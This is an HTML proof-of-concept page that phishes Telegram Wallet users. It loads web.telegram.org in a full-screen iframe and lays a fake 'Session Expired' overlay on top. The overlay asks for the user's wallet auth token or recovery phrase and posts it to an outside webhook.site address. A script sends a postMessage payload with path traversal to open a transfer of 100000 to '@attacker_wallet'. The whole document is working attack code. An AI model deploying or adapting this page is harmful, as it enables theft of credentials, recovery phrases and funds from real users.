
<!DOCTYPE html>
<html>
<head>
  <title>Telegram Wallet UI Phishing PoC</title>
  <style>
    body { margin: 0; }
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 9999;
      padding: 30px;
      font-family: sans-serif;
      text-align: center;
    }
    #overlay h2 {
      color: red;
      font-size: 24px;
    }
    #overlay p {
      font-size: 18px;
    }
    #overlay textarea {
      width: 80%;
      height: 80px;
      font-size: 16px;
    }
    #overlay button {
      padding: 10px 20px;
      font-size: 16px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <!-- Load Telegram Wallet in hidden iframe -->
  <iframe id="tg_frame" src="https://web.telegram.org/a/" style="width:100vw; height:100vh; border:none;"></iframe>

  <!-- Phishing overlay -->
  <div id="overlay">
    <h2>⚠️ Session Expired</h2>
    <p>To continue, please paste your Wallet Auth Token or Recovery Phrase below:</p>
    <form action="https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4" method="POST">
      <textarea name="secret" placeholder="Paste your token or phrase here..."></textarea><br>
      <button type="submit">Verify</button>
    </form>
  </div>

  <script>
    // Send postMessage payload to Telegram Wallet to auto-load transfer screen
    const sendPayload = () => {
      const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
      const message = JSON.stringify({
        eventType: 'web_app_open_tg_link',
        eventData: {
          path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
        }
      });

      const iframe = document.getElementById("tg_frame");
      if (iframe && iframe.contentWindow) {
        iframe.contentWindow.postMessage(message, "*");
        console.log("✅ Sent payload to Telegram Wallet.");
      } else {
        console.warn("⚠️ iframe not ready or blocked.");
      }
    };

    // Wait until iframe is loaded then send payload
    window.onload = () => {
      setTimeout(sendPayload, 2000);
    };
  </script>
</body>
</html>
